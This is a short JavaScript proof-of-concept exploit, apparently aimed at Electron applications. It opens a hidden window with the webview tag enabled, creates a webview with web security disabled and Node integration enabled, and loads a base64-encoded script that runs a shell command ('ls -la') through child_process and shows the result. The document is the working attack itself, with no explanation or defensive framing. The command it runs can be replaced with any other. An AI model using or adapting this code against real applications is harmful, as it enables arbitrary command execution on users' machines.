var x = window.open('data://yoloswag','','webviewTag=yes,show=no');
x.eval(
  "var webview = new WebView;"+
  "webview.setAttribute('webpreferences', 'webSecurity=no, nodeIntegration=yes');"+
  "webview.src = `data:text/html;base64,PHNjcmlwdD5yZXF1aXJlKCdjaGlsZF9wcm9jZXNzJykuZXhlYygnbHMgLWxhJywgZnVuY3Rpb24gKGUscikgeyBhbGVydChyKTt9KTs8L3NjcmlwdD4=`;"+
  "document.body.appendChild(webview)"
);